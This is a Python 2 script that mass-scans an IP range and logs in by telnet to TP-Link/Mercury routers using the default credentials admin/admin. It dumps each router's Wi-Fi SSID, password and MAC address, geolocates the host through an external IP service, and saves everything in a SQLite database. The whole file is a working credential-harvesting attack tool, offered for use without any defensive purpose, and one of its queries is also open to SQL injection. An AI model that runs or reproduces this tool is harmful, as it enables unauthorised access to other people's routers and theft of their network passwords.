#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com

from threading import Thread
from telnetlib import Telnet
import requests
import sqlite3
import Queue
import time
import json
import sys
import os

reload(sys)
sys.setdefaultencoding('utf8')


def ip2num(ip):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]


def num2ip(num):
    return '%s.%s.%s.%s' % (
    (num & 0xff000000) >> 24, (num & 0x00ff0000) >> 16, (num & 0x0000ff00) >> 8, num & 0x000000ff)


def ip_range(start, end):
    return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num & 0xff]


def bThread(iplist):
    threadl = []
    queue = Queue.Queue()
    hosts = iplist
    for host in hosts:
        queue.put(host)
    for x in xrange(0, int(sys.argv[1])):
        threadl.append(tThread(queue))
    for t in threadl:
        try:
            t.daemon = True
            t.start()
        except:
            pass
    for t in threadl:
        t.join()


class tThread(Thread):
    def __init__(self, queue):
        Thread.__init__(self)
        self.queue = queue

    def run(self):
        while not self.queue.empty():
            host = self.queue.get()
            try:
                getinfo(host)
            except Exception, e:
                continue


def getposition(host):
    try:
        ipurl = "http://ip.taobao.com/service/getIpInfo.php?ip=" + host
        header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"}
        req = requests.get(url=ipurl, headers=header, timeout=5)
        jsondata = json.loads(req.content.decode('utf8').encode('utf8'))['data']
        info = [jsondata['country'], jsondata['region'], jsondata['city'], jsondata['isp']]
        return info
    except Exception, e:
        print e


def getinfo(host):
    username = "admin"
    password = "admin"
    telnetTime = 15
    cmdTime = 5

    try:
        t = Telnet(host, timeout=telnetTime)

        t.read_until("username:", cmdTime)
        t.write(username + "\n")
        t.read_until("password:", cmdTime)
        t.write(password + "\n")

        t.write("wlctl show\n")
        t.read_until("SSID", cmdTime)
        wifiStr = t.read_very_eager()

        t.write("lan show info\n")
        t.read_until("MACAddress", cmdTime)
        lanStr = t.read_very_eager()

        t.close()

        if len(wifiStr) > 0:

            # clear extra space
            wifiStr = "".join(wifiStr.split())
            wifiStr = wifiStr.decode('utf-8').encode('utf-8')
            # get SID KEY MAC
            ssid = wifiStr[1:wifiStr.find('QSS')]
            key = wifiStr[wifiStr.find('Key=') + 4:wifiStr.find('cmd')] if wifiStr.find('Key=') != -1 else '无密码'
            mac = lanStr[1:lanStr.find('__')].replace('\r\n', '')

            currentTime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))

            try:
                cx = sqlite3.connect(sys.path[0] + "/TPLINKKEY.db")
                cx.text_factory = str
                cu = cx.cursor()
                cu.execute("select * from scanlog where ssid='%s' and key='%s'" % (ssid, key))
                if not cu.fetchone():
                    posData = getposition(host)
                    country = unicode(posData[0])
                    province = unicode(posData[1])
                    city = unicode(posData[2])
                    isp = unicode(posData[3])
                    cu.execute(
                        "INSERT INTO scanlog (host,mac,ssid,key,country,province,city,isp) VALUES (?,?,?,?,?,?,?,?)",
                        (host, mac, ssid, key, country, province, city, isp))
                    cx.commit()
                    print '[√] [' + currentTime + '] Found ' + host + '  ' + ssid + '  ' + key + ' => Inserted!'
                else:
                    print '[x] [' + currentTime + '] Found ' + host + '  ' + ssid + '  ' + key + ' <= Found in database!'
                cu.close()
                cx.close()
            except Exception, e:
                print e
    except Exception, e:
        pass


if __name__ == '__main__':
    print '=========================================='
    print ' Scan TPLINK(MERCURY) wifi key by telnet'
    print '           Author 92ez.com'
    print '=========================================='

    startIp = sys.argv[2].split('-')[0]
    endIp = sys.argv[2].split('-')[1]
    iplist = ip_range(startIp, endIp)
    thispid = os.getpid()

    print '\n[*] Total ' + str(len(iplist)) + " IP..."
    print '\n================ Running ================='

    try:
        bThread(iplist)
    except KeyboardInterrupt:
        print '\n[*] Kill all thread.'
        os.kill(thispid, 9)
